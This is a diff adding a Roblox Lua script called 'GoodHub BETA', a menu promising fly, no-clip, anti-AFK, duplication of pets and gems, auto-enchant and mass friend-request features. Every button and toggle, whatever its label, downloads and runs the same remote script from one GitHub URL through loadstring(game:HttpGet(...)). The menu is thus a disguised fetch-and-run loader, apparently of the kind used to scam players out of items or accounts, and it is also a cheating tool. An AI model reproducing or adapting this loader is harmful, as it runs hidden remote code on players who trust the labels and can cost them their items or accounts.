@@ -1,0 +1,82 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("GoodHub BETA", "GrapeTheme")
+
+-- MAIN
+local Main = Window:NewTab("Informations")
+local MainSection = Main:NewSection("BETA Version")
+
+MainSection:NewLabel("Discord")
+
+MainSection:NewButton("ZlotyChlopak#8420", "Discord", function()
+    print("Clicked")
+end)
+
+local qwe = Window:NewTab("Misc")
+local qweSection = qwe:NewSection("Beta Version")
+
+qweSection:NewButton("Anti AFk", "This button stops from you getting kicked after 20 minutes.", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/FastDupe/DupeGuiV2/main/Script', true))()
+end)
+
+qweSection:NewButton("Fly", "Makes you Fly", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/FastDupe/DupeGuiV2/main/Script', true))()
+end)
+
+qweSection:NewButton("No Clip", "Makes you walk through walls.", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/FastDupe/DupeGuiV2/main/Script', true))()
+end)
+
+local qqq = Window:NewTab("Pets")
+local qqqSection = qqq:NewSection("Beta Version")
+
+local qqqSection = qqq:NewSection("NOTE: You must have Tier 3 Bank")
+
+qqqSection:NewButton("Dupe Gems", "Dupes Gems", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/FastDupe/DupeGuiV2/main/Script', true))()
+end)
+
+qqqSection:NewButton("Dupe Huges", "Dupes Huges", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/FastDupe/DupeGuiV2/main/Script', true))()
+end)
+
+qqqSection:NewButton("Dupe Exclusives", "Dupes Exclusives", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/FastDupe/DupeGuiV2/main/Script', true))()
+end)
+
+qqqSection:NewButton("Dupe Mythicals", "Dupes Myhicals", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/FastDupe/DupeGuiV2/main/Script', true))()
+end)
+
+local qqqSection = qqq:NewSection("After clicking on Dupe")
+
+local qqqSection = qqq:NewSection("Leave and rejoin after 5 Minutes")
+
+local qqqSection = qqq:NewSection("Fast Auto Enchant")
+
+qqqSection:NewDropdown("Enchants", "DropdownInf", {"Coins V", "Fantasy Coins V", "Tech Coins V", "Rainbow Coins V", "Agility III", "Chest Breaker III", "Strenth V", "Super Teamwork", "Diamonds V", "Charm", "Gift III", "Glittering", "Magnet", "Royalty", "Companion III"}, function(currentOption)
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/FastDupe/DupeGuiV2/main/Script', true))()
+end)
+
+qqqSection:NewToggle("Start Auto Enchant", "STarts the Auto Enchant", function(state)
+    if state then
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/FastDupe/DupeGuiV2/main/Script', true))()
+    else
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/FastDupe/DupeGuiV2/main/Script', true))()
+    end
+end)
+
+local qqqSection = qqq:NewSection("Make sure to equip the pets")
+
+local eee = Window:NewTab("Other")
+local eeeSection = eee:NewSection("BETA Version")
+
+eeeSection:NewButton("Friend Request To All", "Adds everyone is the current server", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/FastDupe/DupeGuiV2/main/Script', true))()
+end)
+
+eeeSection:NewButton("Unfriend All In Server", "Unfriends everyone in the current server", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/FastDupe/DupeGuiV2/main/Script', true))()
+end)
+
+local www = Window:NewTab("Coming Soon...")
+local wwwSection = www:NewSection("Auto Farm Coming Soon...")
